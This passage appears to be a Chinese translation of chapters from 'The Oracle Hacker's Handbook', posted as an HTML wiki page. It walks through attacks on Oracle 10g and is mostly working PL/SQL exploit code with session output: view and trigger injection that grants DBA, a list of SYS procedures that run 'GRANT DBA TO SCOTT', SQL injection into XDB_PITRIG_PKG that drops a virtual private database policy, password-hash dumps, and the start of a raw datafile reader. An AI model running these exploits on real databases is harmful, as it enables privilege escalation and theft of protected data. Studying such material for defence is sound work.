class="line">-- Time to fire it and get dba privs</span><br><span class="line"></span><br><span class="line">insert into system.OL$ (OL_NAME) VALUES (&#x27;OWNED!&#x27;);</span><br><span class="line"></span><br><span class="line">connect scott/tiger</span><br><span class="line">set serveroutput on</span><br><span class="line">SELECT USERNAME,PASSWORD FROM DBA_USERS;</span><br><span class="line">DROP TRIGGER SYSTEM.THE_TRIGGER;</span><br></pre></td></tr></table></figure><h3 id="从CREATE-ANY-VIEW获取DBA"><a href="#从CREATE-ANY-VIEW获取DBA" class="headerlink" title="从CREATE ANY VIEW获取DBA"></a>从CREATE ANY VIEW获取DBA</h3><p>您可以以类似的方式利用 CREATE ANY VIEW。 默认情况下，在 10g 第 2 版中，授予此权限的唯一用户是 SYS； 如果您可以将 SQL 注入 SYS 过程，那么您无论如何都已经是 DBA。 出于说明目的，让我们假设一个具有此权限的测试用户并创建一个易受攻击的过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">connect / as sysdba</span><br><span class="line">create user vtest identified by vtest;</span><br><span class="line">grant create session to vtest;</span><br><span class="line">grant create any view to vtest;</span><br><span class="line">grant create procedure to vtest;</span><br><span class="line"></span><br><span class="line">-- now connect as vtest</span><br><span class="line">connect vtest/vtest</span><br><span class="line">set serveroutput on</span><br><span class="line">-- create a vulnerable procedure</span><br><span class="line">create or replace procedure vproc (vt varchar2) is</span><br><span class="line">stmt varchar2(200);</span><br><span class="line">num number;</span><br><span class="line">begin</span><br><span class="line">stmt:=&#x27;select count(*) from &#x27; || vt;</span><br><span class="line">execute immediate stmt into num;</span><br><span class="line">dbms_output.put_line(num);</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line">grant execute on vproc to public;</span><br><span class="line">-- test it</span><br><span class="line">exec vproc(&#x27;ALL_OBJECTS&#x27;);</span><br></pre></td></tr></table></figure><p>有了我们的易受攻击的程序和具有 CREATE ANY VIEW 权限的测试用户，让我们开始利用它来获得 DBA 权限。</p><p>我们需要在 DBA 的模式中创建视图，然后以某种方式让高权限用户访问该视图。 第二部分可能听起来很难，但实际上并非如此。 SYS 拥有的数百个过程实例将视图或表的名称作为参数，然后它进行访问。 出于演示目的，让我们节省时间并快速创建我们自己的 - 通过使用 DBMS_ASSERT.QUALIFIED_SQL_NAME 函数确保它不会受到 SQL 注入的影响：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">connect / as sysdba</span><br><span class="line">create or replace procedure sproc (vt varchar2) is</span><br><span class="line">stmt varchar2(200);</span><br><span class="line">num number;</span><br><span class="line">begin</span><br><span class="line">stmt:=&#x27;select count(*) from &#x27; || dbms_assert.qualified_sql_name(vt);</span><br><span class="line">execute immediate stmt into num;</span><br><span class="line">dbms_output.put_line(num);</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line">grant execute on sproc to public;</span><br></pre></td></tr></table></figure><p>好的，现在来获得 DBA 权限。 我们要做的是将我们自己的过程注入到 VTEST.VPROC 过程中，该过程在 SYSTEM 模式中创建一个视图。 我们在这里选择 SYSTEM 模式是因为 CREATE ANY VIEW 权限不允许我们在 SYS 模式中创建视图。 我们创建的视图将调用我们拥有的函数，并将我们的最终代码放在此处以获取 DBA 权限。 当我们通过 SYS.SPROC 过程访问视图时，将执行此函数，授予我们 DBA 权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">connect scott/tiger</span><br><span class="line"></span><br><span class="line">-- create the function that will be called from the view</span><br><span class="line">-- and grants us DBA privileges</span><br><span class="line"></span><br><span class="line">create or replace function get_dba return number authid current_user is</span><br><span class="line">pragma autonomous_transaction;</span><br><span class="line">begin</span><br><span class="line">execute immediate &#x27;grant dba to scott&#x27;;</span><br><span class="line">commit;</span><br><span class="line">return 1;</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line">grant execute on get_dba to public;</span><br><span class="line"></span><br><span class="line">-- create the function that we&#x27;ll inject into VTEST.VPROC</span><br><span class="line">-- and creates a view in the SYSTEM schema which calls</span><br><span class="line">-- our get_dba function</span><br><span class="line"></span><br><span class="line">create or replace function create_the_view return number authid</span><br><span class="line">current_user is</span><br><span class="line"></span><br><span class="line">pragma autonomous_transaction;</span><br><span class="line">begin</span><br><span class="line">execute immediate &#x27;create or replace view system.the_sysview (val) as</span><br><span class="line">select 1 from dual where scott.get_dba()=1&#x27;;</span><br><span class="line">commit;</span><br><span class="line">return 1;</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line">grant execute on create_the_view to public;</span><br><span class="line"></span><br><span class="line">-- now inject the create_the_view function into VTEST.VPROC</span><br><span class="line"></span><br><span class="line">exec vtest.vproc(&#x27;ALL_OBJECTS where scott.create_the_view() = 1--&#x27;);</span><br><span class="line"></span><br><span class="line">-- The view should now be created</span><br><span class="line">-- All that&#x27;s left to do is get our dba privs</span><br><span class="line"></span><br><span class="line">exec sys.sproc(&#x27;SYSTEM.THE_SYSVIEW&#x27;);</span><br><span class="line"></span><br><span class="line">-- now claim our newly issued privileges</span><br><span class="line">set role dba</span><br><span class="line">-- and use them</span><br><span class="line">select username, password from sys.dba_users;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/9.png"></p><h3 id="从EXECUTE-ANY-PROCEDURE获取DBA"><a href="#从EXECUTE-ANY-PROCEDURE获取DBA" class="headerlink" title="从EXECUTE ANY PROCEDURE获取DBA"></a>从EXECUTE ANY PROCEDURE获取DBA</h3><p>我几乎不需要解释这一点。 毋庸置疑，当拥有此权限的用户可以找到 SYS 拥有的执行任意 SQL 的过程时，他们可以立即获得 DBA。 有很多这样的程序，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">EXEC SYS.LTADM.EXECSQL(&#x27;GRANT DBA TO SCOTT&#x27;);</span><br><span class="line">EXEC SYS.LTADM.EXECSQLAUTO(&#x27;GRANT DBA TO SCOTT&#x27;);</span><br><span class="line">EXEC SYS.DBMS_PRVTAQIM.EXECUTE_STMT(&#x27;GRANT DBA TO SCOTT&#x27;);</span><br><span class="line">EXEC SYS.DBMS_STREAMS_RPC.EXECUTE_STMT(&#x27;GRANT DBA TO SCOTT&#x27;);</span><br><span class="line">EXEC SYS.DBMS_AQADM_SYS.EXECUTE_STMT(&#x27;GRANT DBA TO SCOTT&#x27;);</span><br><span class="line">EXEC SYS.DBMS_STREAMS_ADM_UTL.EXECUTE_SQL_STRING(&#x27;GRANT DBA TO SCOTT&#x27;);</span><br><span class="line">EXEC INITJVMAUX.EXEC(&#x27;GRANT DBA TO SCOTT&#x27;,TRUE);</span><br><span class="line">EXEC SYS.DBMS_REPACT_SQL_UTL.DO_SQL(&#x27;GRANT DBA TO SCOTT&#x27;,TRUE);</span><br><span class="line">EXEC SYS.DBMS_AQADM_SYSCALLS.KWQA_3GL_EXECUTESTMT(&#x27;begin null; end;&#x27;);</span><br></pre></td></tr></table></figure><h3 id="从CREATE-PROCEDURE获取DBA"><a href="#从CREATE-PROCEDURE获取DBA" class="headerlink" title="从CREATE PROCEDURE获取DBA"></a>从CREATE PROCEDURE获取DBA</h3><p>好的 - 这就是问题所在。 我们在一个只有很少权限的用户拥有的包中发现了一个 SQL 注入缺陷。 OLAPSYS、MDSYS、DBSNMP 和 ORDSYS 等帐户被授予创建过程权限。 因此，如果他们更改了其他人拥有的另一个过程所依赖的一个过程，那么他们就可以开始以该其他用户的身份执行代码。 如果该用户不是 DBA，那么您至少更近了一步。 例如，SYS 拥有的 VALIDATE_CONTEXT 过程依赖于 CTXSYS 拥有的 DRUE 包。 如果 CTXSYS 更改此包并将漏洞利用代码放入其中，则 CTXSYS 可以获得 DBA 权限。 因此，如果 CTXSYS 拥有一个容易受到 SQL 注入攻击的 PUBLIC 可执行过程，那么就有可能获得 DBA 特权。 碰巧的是，在 10g 第 2 版 CTXSYS 上没有此特权，但您明白了。 要查看哪个过程取决于什么，请检查 DBA_DEPENDENCIES 视图。</p><h2 id="攻击虚拟专用数据库"><a href="#攻击虚拟专用数据库" class="headerlink" title="攻击虚拟专用数据库"></a>攻击虚拟专用数据库</h2><p>本章假设您了解虚拟专用数据库 (VPD)。 如果您不了解，我推荐 David Knox 的 Effective Oracle Database 10g Security by Design（McGraw-Hill，2004 年）。 简而言之，VPD 是 Oracle 内置的一种安全机制，它允许细粒度的访问控制。 它用于强制执行安全策略。 本质上，VPD 只允许用户访问策略指定他们可以访问的数据，而不能访问更多数据。 但是，有多种方法可以攻击 VPD。 本章看几个。</p><h3 id="欺骗-Oracle-删除策略"><a href="#欺骗-Oracle-删除策略" class="headerlink" title="欺骗 Oracle 删除策略"></a>欺骗 Oracle 删除策略</h3><p>VPD 是使用 DBMS_RLS 包创建的。 也可以使用 DBMS_FGA 包——它们的作用完全相同。 顺便提一下，RLS 代表行级安全，而 FGA 代表细粒度访问。 如果我们想看看谁可以执行这个包，我们得到以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select grantee,privilege from dba_tab_privs where table_name</span><br><span class="line">=&#x27;DBMS_RLS&#x27;;</span><br><span class="line"></span><br><span class="line">GRANTEE                  PRIVILEGE</span><br><span class="line">------------------------------</span><br><span class="line">EXECUTE_CATALOG_ROLE      EXECUTE</span><br><span class="line"></span><br><span class="line">XDB                        EXECUTE</span><br><span class="line">WKSYS                        EXECUTE</span><br><span class="line">SQL&gt; select grantee,privilege from dba_tab_privs where table_name</span><br><span class="line">=&#x27;DBMS_FGA&#x27;;</span><br><span class="line"></span><br><span class="line">GRANTEE                  PRIVILEGE</span><br><span class="line">------------------------------</span><br><span class="line">EXECUTE_CATALOG_ROLE      EXECUTE</span><br></pre></td></tr></table></figure><p>综上所述，如果我们可以将代码作为 XDB 或 WKSYS 执行，那么我们就可以操纵 RLS 策略。 在开始之前，让我们设置一个简单的 VPD。 首先，创建将拥有 VPD 的用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT / AS SYSDBA</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; CREATE USER VPD IDENTIFIED BY PASS123;</span><br><span class="line"></span><br><span class="line">User created.</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT CREATE SESSION TO VPD;</span><br><span class="line"></span><br><span class="line">Grant succeeded.</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT CREATE TABLE TO VPD;</span><br><span class="line"></span><br><span class="line">Grant succeeded.</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT CREATE PROCEDURE TO VPD;</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT UNLIMITED TABLESPACE TO VPD;</span><br><span class="line"></span><br><span class="line">Grant succeeded.</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT EXECUTE ON DBMS_RLS TO VPD;</span><br><span class="line"></span><br><span class="line">Grant succeeded.</span><br></pre></td></tr></table></figure><p>完成后，我们可以设置一个表用作 VPD。 在这个例子中，我们将创建一个存储army订单的表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT VPD/PASS123</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; CREATE TABLE VPDTESTTABLE (CLASSIFICATION VARCHAR2(20),</span><br><span class="line">  2 ORDER_TEXT VARCHAR(20), RANK VARCHAR2(20));</span><br><span class="line"></span><br><span class="line">Table created.</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT SELECT ON VPDTESTTABLE TO PUBLIC;</span><br><span class="line"></span><br><span class="line">Grant succeeded.</span><br><span class="line"></span><br><span class="line">SQL&gt; INSERT INTO VPDTESTTABLE (CLASSIFICATION, ORDER_TEXT, RANK) VALUES</span><br><span class="line">(&#x27;SECRET&#x27;,&#x27;CAPTURE ENEMY BASE&#x27;,&#x27;GENERAL&#x27;);</span><br><span class="line"></span><br><span class="line">1 row created.</span><br><span class="line"></span><br><span class="line">SQL&gt; INSERT INTO VPDTESTTABLE (CLASSIFICATION, ORDER_TEXT, RANK)</span><br><span class="line">VALUES(&#x27;UNCLASSIFIED&#x27;,&#x27;UPDATE DUTY ROTA&#x27;,&#x27;CORPORAL&#x27;);</span><br><span class="line"></span><br><span class="line">1 row created.</span><br><span class="line"></span><br><span class="line">SQL&gt; INSERT INTO VPDTESTTABLE (CLASSIFICATION, ORDER_TEXT, RANK)</span><br><span class="line">VALUES(&#x27;SECRET&#x27;,&#x27;INVADE ON TUESDAY&#x27;,&#x27;COLONEL&#x27;);</span><br><span class="line"></span><br><span class="line">1 row created.</span><br><span class="line"></span><br><span class="line">SQL&gt; INSERT INTO VPDTESTTABLE (CLASSIFICATION, ORDER_TEXT, RANK)</span><br><span class="line">VALUES(&#x27;UNCLASSIFIED&#x27;,&#x27;POLISH BOOTS&#x27;,&#x27;MAJOR&#x27;);</span><br><span class="line"></span><br><span class="line">1 row created.</span><br></pre></td></tr></table></figure><p>在设置 VPD 之前，因为我们已授予 PUBLIC 执行权限，任何人都可以访问标记为 SECRET 的订单：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT SCOTT/TIGER</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; SELECT * FROM VPD.VPDTESTTABLE;</span><br><span class="line"></span><br><span class="line">CLASSIFICATION       ORDER_TEXT           RANK</span><br><span class="line">-------------------- -------------------- ---------</span><br><span class="line">SECRET               CAPTURE ENEMY BASE   GENERAL</span><br><span class="line">UNCLASSIFIED         UPDATE DUTY ROTA     CORPORAL</span><br><span class="line">SECRET               INVADE ON TUESDAY    COLONEL</span><br><span class="line">UNCLASSIFIED         POLISH BOOTS         MAJOR</span><br></pre></td></tr></table></figure><p>我们将设置一个虚拟专用数据库来防止这种情况。 首先，我们创建一个返回谓词的函数——本质上是一个 where 子句，它被附加到对表的查询的末尾：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT VPD/PASS123</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; CREATE OR REPLACE FUNCTION HIDE_SECRET_ORDERS(p_schema IN</span><br><span class="line">VARCHAR2,p_object IN VARCHAR2)</span><br><span class="line">  2  RETURN VARCHAR2</span><br><span class="line">  3  AS</span><br><span class="line">  4  BEGIN</span><br><span class="line">  5  RETURN &#x27;CLASSIFICATION !=&#x27;&#x27;SECRET&#x27;&#x27;&#x27;;</span><br><span class="line">  6  END;</span><br><span class="line"></span><br><span class="line">  7  /</span><br><span class="line"></span><br><span class="line">Function created.</span><br></pre></td></tr></table></figure><p>创建函数后，现在可以使用它来执行策略 - 我们将其称为 SECRECY：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; BEGIN</span><br><span class="line">  2  DBMS_RLS.add_policy</span><br><span class="line">  3  (object_schema    =&gt; &#x27;VPD&#x27;,</span><br><span class="line">  4  object_name      =&gt; &#x27;VPDTESTTABLE&#x27;,</span><br><span class="line">  5  policy_name      =&gt; &#x27;SECRECY&#x27;,</span><br><span class="line">  6  policy_function  =&gt; &#x27;HIDE_SECRET_ORDERS&#x27;);</span><br><span class="line">  7  END;</span><br><span class="line">  8  /</span><br><span class="line"></span><br><span class="line">PL/SQL procedure successfully completed.</span><br></pre></td></tr></table></figure><p>现在，如果我们以 SCOTT 的身份重新连接并从此表中选择，我们将只会看到non-secret 订单：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT SCOTT/TIGER</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; SELECT * FROM VPD.VPDTESTTABLE;</span><br><span class="line"></span><br><span class="line">CLASSIFICATION       ORDER_TEXT           RANK</span><br><span class="line">-------------------- -------------------- --------------</span><br><span class="line">UNCLASSIFIED         UPDATE DUTY ROTA     CORPORAL</span><br><span class="line">UNCLASSIFIED         POLISH BOOTS         MAJOR</span><br></pre></td></tr></table></figure><p>是时候再次访问了……</p><p>早些时候有人指出 XDB 可以执行 DBMS_RLS 包。 从理论上讲，如果我们能在 XDB 拥有的任何包中发现缺陷，我们就可以利用它来删除策略。 在寻找这样一个缺陷以将理论变为实际之后，我们在 DB_PITRIG_PKG 包中遇到了一个 - SQL 注入缺陷：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT SCOTT/TIGER</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; SELECT * FROM VPD.VPDTESTTABLE;</span><br><span class="line"></span><br><span class="line">CLASSIFICATION       ORDER_TEXT           RANK</span><br><span class="line">-------------------- -------------------- --------------</span><br><span class="line">UNCLASSIFIED         UPDATE DUTY ROTA     CORPORAL</span><br><span class="line">UNCLASSIFIED         POLISH BOOTS         MAJOR</span><br><span class="line"></span><br><span class="line">SQL&gt; CREATE OR REPLACE FUNCTION F RETURN NUMBER AUTHID CURRENT_USER IS</span><br><span class="line">  2  PRAGMA AUTONOMOUS_TRANSACTION;</span><br><span class="line"></span><br><span class="line">  3  BEGIN</span><br><span class="line">  4  DBMS_OUTPUT.PUT_LINE(&#x27;HELLO&#x27;);</span><br><span class="line">  5  EXECUTE IMMEDIATE &#x27;BEGIN</span><br><span class="line">SYS.DBMS_RLS.DROP_POLICY(&#x27;&#x27;VPD&#x27;&#x27;,&#x27;&#x27;VPDTESTTABLE&#x27;&#x27;,&#x27;&#x27;SECRECY&#x27;&#x27;); END;&#x27;;</span><br><span class="line">  6  RETURN 1;</span><br><span class="line">  7  COMMIT;</span><br><span class="line">  8  END;</span><br><span class="line">  9  /</span><br><span class="line"></span><br><span class="line">Function created.</span><br><span class="line"></span><br><span class="line">SQL&gt; CREATE TABLE FOO (X NUMBER);</span><br><span class="line"></span><br><span class="line">SQL&gt; EXEC XDB.XDB_PITRIG_PKG.PITRIG_DROP(&#x27;SCOTT&quot;.&quot; FOO&quot; WHERE</span><br><span class="line">1=SCOTT.F()--&#x27;,&#x27;BBBB&#x27;);</span><br><span class="line"></span><br><span class="line">PL/SQL procedure successfully completed.</span><br><span class="line"></span><br><span class="line">SQL&gt; SELECT * FROM VPD.VPDTESTTABLE;</span><br><span class="line"></span><br><span class="line">CLASSIFICATION       ORDER_TEXT           RANK</span><br><span class="line">-------------------- -------------------- --------------------</span><br><span class="line">SECRET               CAPTURE ENEMY BASE   GENERAL</span><br><span class="line">UNCLASSIFIED         UPDATE DUTY ROTA     CORPORAL</span><br><span class="line">SECRET               INVADE ON TUESDAY    COLONEL</span><br><span class="line">UNCLASSIFIED         POLISH BOOTS         MAJOR</span><br><span class="line"></span><br><span class="line">SQL&gt;</span><br></pre></td></tr></table></figure><p>现在我们可以再次访问SECRECY订单。 那么这里发生了什么？ XDB_PITRIG_PKG 包的 PITRIG_DROP 过程容易受到 SQL 注入的影响，并且由于该包可由 PUBLIC 执行，因此任何人都可以作为 XDB 执行 SQL。 我们创建了一个名为 F 的函数，它执行以下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line"></span><br><span class="line">SYS.DBMS_RLS.DROP_POLICY(&#x27;VPD&#x27;,&#x27;VPDTESTTABLE&#x27;,&#x27;SECRECY&#x27;);</span><br><span class="line"></span><br><span class="line">END;</span><br></pre></td></tr></table></figure><p>这会从 VPDTESTTABLE 中删除 SECRECY 策略。 然后我们将此函数注入到 XDB_PITRIG_PKG.PITRIG_DROP 中，它以 XDB 权限执行，从而删除策略并让我们再次访问秘密数据。 此外，创建 FOO 表并将其保留为空以停止“ORA-31007：尝试删除非空容器”错误，如果我们使用例如 SCOTT.EMP，我们会得到该错误。 坦率地说，SYS 拥有的定义者权限包中的任何 SQL 注入缺陷都会同样有效 - 但这一点已经得到了解决。 如果您不知道 VPDTESTTABLE 上的策略名称，则可以从 ALL_POLICIES 视图中获取此信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select OBJECT_OWNER, OBJECT_NAME, POLICY_NAME FROM ALL_POLICIES;</span><br><span class="line"></span><br><span class="line">OBJECT_OWNER      OBJECT_NAME            POLICY_NAME</span><br><span class="line">------------       -----------            -------------</span><br><span class="line">VPD               VPDTESTTABLE              SECRECY</span><br></pre></td></tr></table></figure><h3 id="使用原始文件访问攻击VPD"><a href="#使用原始文件访问攻击VPD" class="headerlink" title="使用原始文件访问攻击VPD"></a>使用原始文件访问攻击VPD</h3><p>您可以通过访问原始数据文件本身来完全绕过数据库强制访问控制。 这在第 11 章中有完整的介绍——但现在是代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">SET ESCAPE ON</span><br><span class="line">SET ESCAPE &quot;\&quot;</span><br><span class="line">SET SERVEROUTPUT ON</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVAREADBINFILE&quot; AS</span><br><span class="line">import java.lang.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class JAVAREADBINFILE</span><br><span class="line">&#123;</span><br><span class="line">        public static void readbinfile(String f, int start) throws</span><br><span class="line">IOException</span><br><span class="line">      &#123;</span><br><span class="line">             FileInputStream fis;</span><br><span class="line">            DataInputStream dis;</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                  int i;</span><br><span class="line">                  int ih,il;</span><br><span class="line">                  int cnt = 1, h=0,l=0;</span><br><span class="line">                  String hex[] = &#123;&quot;0&quot;, &quot;1&quot;, &quot;2&quot;,&quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;,</span><br><span class="line">&quot;8&quot;,&quot;9&quot;, &quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;, &quot;E&quot;,&quot; F&quot;&#125;;</span><br><span class="line"></span><br><span class="line">                  RandomAccessFile raf = new RandomAccessFile (f, &quot;r&quot;);</span><br><span class="line">                  raf.seek (start);</span><br><span class="line">                  for(i=0; i&lt;=512; i++)</span><br><span class="line">                  &#123;</span><br><span class="line">                        ih = il = raf.readByte() \&amp; 0xFF;</span><br><span class="line">                        h = ih &gt;&gt; 4;</span><br><span class="line"></span><br><span class="line">                           l = il \&amp; 0x0F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                           System.out.print(&quot;\\\\x&quot; + hex[h] + hex[l]);</span><br><span class="line">                           if(cnt \% 16 == 0)</span><br><span class="line">                                 System.out.println();</span><br><span 